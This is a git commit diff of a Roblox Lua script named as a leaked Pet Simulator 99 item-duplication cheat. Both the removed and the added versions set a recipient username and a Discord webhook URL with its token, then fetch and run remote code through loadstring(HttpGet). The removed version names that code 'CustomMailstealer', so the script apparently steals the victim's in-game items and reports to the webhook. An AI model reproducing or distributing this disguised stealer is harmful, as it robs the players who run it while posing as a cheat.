1d41e12f4b41a1ce698e388955bf1c10d078fff5
Xyokuro <93172072+Xyokuro@users.noreply.github.com>
2024-02-17 19:32:32 -0500

    Update ps99LeakedDupe.lua

--- ps99LeakedDupe.lua
+++ ps99LeakedDupe.lua
@@ -1,7 +1,7 @@
-﻿Username = "yokuyoku17"
-Webhook = "https://discord.com/api/webhooks/1060014639099936858/L8jf5NfB9SKOoZnTbjGMwWmI3VRmmZZLnplHtKYiSi6UNA_IjfHB2Ru0vJPd28SoCqTU"
 
-G_LoadingScreen = "Get Fucked honestly "
-G_WebhookName = "CgkBot"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriCustom/main/CustomMailstealer"))()
+Username = "yokuyoku17"
+webhook = "https://discord.com/api/webhooks/1060014639099936858/L8jf5NfB9SKOoZnTbjGMwWmI3VRmmZZLnplHtKYiSi6UNA_IjfHB2Ru0vJPd28SoCqTU"
+loadingscreen = true
+delay = 0 
+farmui = false 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()
